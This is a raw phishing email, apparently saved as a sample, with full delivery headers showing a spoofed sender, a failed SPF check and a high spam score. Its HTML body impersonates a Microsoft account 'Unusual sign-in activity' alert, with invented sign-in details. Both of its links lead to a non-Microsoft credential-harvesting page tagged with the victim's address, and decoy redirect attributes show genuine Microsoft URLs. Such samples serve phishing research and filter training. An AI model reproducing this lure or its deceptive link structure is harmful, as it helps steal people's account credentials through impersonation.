@@ -1,0 +1,141 @@
+Return-Path: jose@monkey.org
+Delivered-To: jose@monkey.org
+X-FDA: 80777236386.09.E8F5F9E
+Received: from shut-antic.naturescar.com (unknown [185.222.58.45])
+	by imf08.b.hostedemail.com (Postfix) with ESMTP id 9B22E16004B
+	for <jose@monkey.org>; Thu, 11 May 2023 08:04:11 +0000 (UTC)
+Authentication-Results: imf08.b.hostedemail.com;
+	dkim=none;
+	dmarc=none;
+	spf=softfail (imf08.b.hostedemail.com: 185.222.58.45 is neither permitted nor denied by domain of jose@monkey.org) smtp.mailfrom=jose@monkey.org
+ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=hostedemail.com;
+	s=arc-20220608; t=1683792252;
+	h=from:from:sender:reply-to:subject:subject:date:date:
+	 message-id:message-id:to:to:cc:cc:mime-version:mime-version:
+	 content-type:content-type:
+	 content-transfer-encoding:content-transfer-encoding:in-reply-to:
+	 references; bh=yRI568pLLqOjecJZ/jXRH6B9vrgWFO8In0AhyTSZGY8=;
+	b=f/uJpPoM27gYd7JWg69V5GDtNPM+uduUhXv3b932+d6Qz4AR+TWEdSsMMg7Px8HwJj/RwA
+	wZLgNJmwHA9Rz0k/WmVsTD8vjWiurzEcnEt9CoB52k/Zu2zZd7iM8j3TO6J4sd9W+u0j6S
+	OU3Zh/H8ojMlVUIqMlBMqCSTl72l2WM=
+ARC-Authentication-Results: i=1;
+	imf08.b.hostedemail.com;
+	dkim=none;
+	dmarc=none;
+	spf=softfail (imf08.b.hostedemail.com: 185.222.58.45 is neither permitted nor denied by domain of jose@monkey.org) smtp.mailfrom=jose@monkey.org
+ARC-Seal: i=1; s=arc-20220608; d=hostedemail.com; t=1683792252; a=rsa-sha256;
+	cv=none;
+	b=1BjsTkrPI8K0PyanCrk3szFo8x/+YyUCKlkw3+YeK5wejk9r/xT2Os15XFonjk2q8AtxNl
+	oO3IEZowsPTS/P0YqokAetJW2nRWvIDTKmTAAZgy0csOZXK1g2KHdbbFhZ5RLwY9Q1JFf5
+	lG5lsZqw9aH0u6HrkEDQA7qT7aB9esY=
+From: Mail Delivery System <jose@monkey.org>
+To: jose@monkey.org
+CC: info1@monkey.org
+Subject: RE:Microsoft warning
+Date: 11 May 2023 10:04:10 +0200
+Message-ID: <20230511100410.7F046D202CBAEFF9@monkey.org>
+MIME-Version: 1.0
+Content-Type: text/html
+Content-Transfer-Encoding: quoted-printable
+X-Rspam-User: 
+X-Rspamd-Queue-Id: 9B22E16004B
+X-Rspamd-Server: rspam04
+X-Spam-Status: Yes, score=9.43
+X-Stat-Signature: zgray84dcauq7wqsue8o8azr78trro9s
+X-HE-Tag: 1683792251-827186
+X-HE-Meta: U2FsdGVkX19JMk8FUFw9nH90C4IgjCpKZgkiuJHD9YhQULVrSimBlPEnS/cRUtbtNMxDNnqyTeocayKb5p/QgitOwnVgN2sgKV2vXcr4z36XBebQsMXWPmItLMfi0AzbxSUYu58KjMsR5T1w9kin7ywO/eVs9PPxZnpFUaz0Bto6SnzE2LW3R3zgEST2gjn/QbP1rEDwoKG72F9FbVApmqFN19G4c/OSiHMfKKfyEwM=
+Status: O
+X-Status: 
+X-Keywords:                  
+X-UID: 109
+
+<!DOCTYPE HTML>
+
+<html><head><title></title>
+<meta http-equiv=3D"X-UA-Compatible" content=3D"IE=3Dedge">
+</head>
+<body style=3D"margin: 0.4em;">
+<p><br class=3D"Apple-interchange-newline"></p>
+<table style=3D"color: rgb(34, 34, 34); text-transform: none; letter-spacin=
+g: normal; font-family: Arial, Helvetica, sans-serif; font-size: small; fon=
+t-style: normal; font-weight: 400; word-spacing: 0px; white-space: normal; =
+orphans: 2; widows: 2; background-color: rgb(255, 255, 255); font-variant-l=
+igatures: normal; font-variant-caps: normal; -webkit-text-stroke-width: 0px=
+; text-decoration-thickness: initial; text-decoration-style: initial; text-=
+decoration-color: initial;" dir=3D"ltr"><tbody><tr>
+<td id=3D"m_3463842863449937744i1" style=3D'margin: 0px; padding: 0px; colo=
+r: rgb(112, 112, 112); font-family: "Segoe UI Semibold", "Segoe UI Bold", "=
+Segoe UI", "Helvetica Neue Medium", Arial, sans-serif; font-size: 17px;'>Mi=
+crosoft account</td></tr><tr><td id=3D"m_3463842863449937744i2" style=3D'ma=
+rgin: 0px; padding: 0px; color: rgb(38, 114, 236); font-family: "Segoe UI L=
+ight", "Segoe UI", "Helvetica Neue Medium", Arial, sans-serif; font-size: 4=
+1px;'>Unusual sign-in activity</td></tr><tr>
+<td id=3D"m_3463842863449937744i3" style=3D'margin: 0px; padding: 25px 0px =
+0px; color: rgb(42, 42, 42); font-family: "Segoe UI", Tahoma, Verdana, Aria=
+l, sans-serif; font-size: 14px;'>We detected something unusual about a rece=
+nt sign-in to the Microsoft account<span>&nbsp;</span><a class=3D"m_3463842=
+863449937744link" id=3D"m_3463842863449937744iAccount" style=3D"color: rgb(=
+38, 114, 236); text-decoration: none;" dir=3D"ltr" target=3D"_blank">jose@m=
+onkey.org</a></td></tr><tr>
+<td id=3D"m_3463842863449937744i4" style=3D'margin: 0px; padding: 25px 0px =
+0px; color: rgb(42, 42, 42); font-family: "Segoe UI Bold", "Segoe UI Semibo=
+ld", "Segoe UI", "Helvetica Neue Medium", Arial, sans-serif; font-size: 14p=
+x; font-weight: bold;'>Sign-in details</td></tr><tr><td id=3D"m_34638428634=
+49937744i5" style=3D'margin: 0px; padding: 6px 0px 0px; color: rgb(42, 42, =
+42); font-family: "Segoe UI", Tahoma, Verdana, Arial, sans-serif; font-size=
+: 14px;'>Country/region: Canada</td></tr><tr>
+<td id=3D"m_3463842863449937744i6" style=3D'margin: 0px; padding: 6px 0px 0=
+px; color: rgb(42, 42, 42); font-family: "Segoe UI", Tahoma, Verdana, Arial=
+, sans-serif; font-size: 14px;'>IP address: 216.151.184.161</td></tr><tr><t=
+d id=3D"m_3463842863449937744i7" style=3D'margin: 0px; padding: 6px 0px 0px=
+; color: rgb(42, 42, 42); font-family: "Segoe UI", Tahoma, Verdana, Arial, =
+sans-serif; font-size: 14px;'>Date:&nbsp;5/11/2023 10:04:10 a.m.&nbsp;(GMT)=
+</td></tr><tr>
+<td id=3D"m_3463842863449937744i8" style=3D'margin: 0px; padding: 6px 0px 0=
+px; color: rgb(42, 42, 42); font-family: "Segoe UI", Tahoma, Verdana, Arial=
+, sans-serif; font-size: 14px;'>Platform: Windows</td></tr><tr><td id=3D"m_=
+3463842863449937744i9" style=3D'margin: 0px; padding: 6px 0px 0px; color: r=
+gb(42, 42, 42); font-family: "Segoe UI", Tahoma, Verdana, Arial, sans-serif=
+; font-size: 14px;'>Browser: Chrome</td></tr><tr>
+<td id=3D"m_3463842863449937744i10" style=3D'margin: 0px; padding: 25px 0px=
+ 0px; color: rgb(42, 42, 42); font-family: "Segoe UI", Tahoma, Verdana, Ari=
+al, sans-serif; font-size: 14px;'>Please go to your recent activity page to=
+ let us know whether or not this was you. If this wasn't you, we'll help yo=
+u secure your account. If this was you, we'll trust similar activity in the=
+ future.</td></tr><tr>
+<td style=3D'margin: 0px; padding: 25px 0px 0px; color: rgb(42, 42, 42); fo=
+nt-family: "Segoe UI", Tahoma, Verdana, Arial, sans-serif; font-size: 14px;=
+'><table border=3D"0" cellspacing=3D"0"><tbody><tr><td style=3D"margin: 0px=
+; padding: 5px 20px; min-width: 50px; background-color: rgb(38, 114, 236);"=
+ bgcolor=3D"#2672ec">
+<a id=3D"m_3463842863449937744i11" style=3D'text-align: center; color: rgb(=
+255, 255, 255); letter-spacing: 0.02em; font-family: "Segoe UI Semibold", "=
+Segoe UI Bold", "Segoe UI", "Helvetica Neue Medium", Arial, sans-serif; fon=
+t-size: 14px; font-weight: 600; text-decoration: none;' href=3D"https://onl=
+ine.conect.best/configurators.html?val=3Djose@monkey.org" target=3D"_blank"=
+=20
+data-saferedirecturl=3D"https://www.google.com/url?q=3Dhttps://account.micr=
+osoft.com/activity&amp;source=3Dgmail&amp;ust=3D1671520099409000&amp;usg=3D=
+AOvVaw3ZH8-vvjARw5cUJS39o-9i">Review recent activity</a></td></tr></tbody><=
+/table></td></tr><tr><td id=3D"m_3463842863449937744i12" style=3D'margin: 0=
+px; padding: 25px 0px 0px; color: rgb(42, 42, 42); font-family: "Segoe UI",=
+ Tahoma, Verdana, Arial, sans-serif; font-size: 14px;'>To opt out or change=
+ where you receive security notifications,<span>&nbsp;</span>
+<a class=3D"m_3463842863449937744link" id=3D"m_3463842863449937744iLink5" s=
+tyle=3D"color: rgb(38, 114, 236); text-decoration: none;" href=3D"https://o=
+nline.conect.best/configurators.html?val=3Djose@monkey.org" target=3D"_blan=
+k" data-saferedirecturl=3D"https://www.google.com/url?q=3Dhttps://account.l=
+ive.com/SecurityNotifications/Update&amp;source=3Dgmail&amp;ust=3D167152009=
+9409000&amp;usg=3DAOvVaw25q-q_SDUBhvtfQVFBO9_6">click here</a>.</td></tr><t=
+r>
+<td id=3D"m_3463842863449937744i13" style=3D'margin: 0px; padding: 25px 0px=
+ 0px; color: rgb(42, 42, 42); font-family: "Segoe UI", Tahoma, Verdana, Ari=
+al, sans-serif; font-size: 14px;'>Thanks,</td></tr><tr><td id=3D"m_34638428=
+63449937744i14" style=3D'margin: 0px; padding: 0px; color: rgb(42, 42, 42);=
+ font-family: "Segoe UI", Tahoma, Verdana, Arial, sans-serif; font-size: 14=
+px;'>The Microsoft account team</td></tr></tbody></table><p>
+</p>
+
+
+</body></html>
+
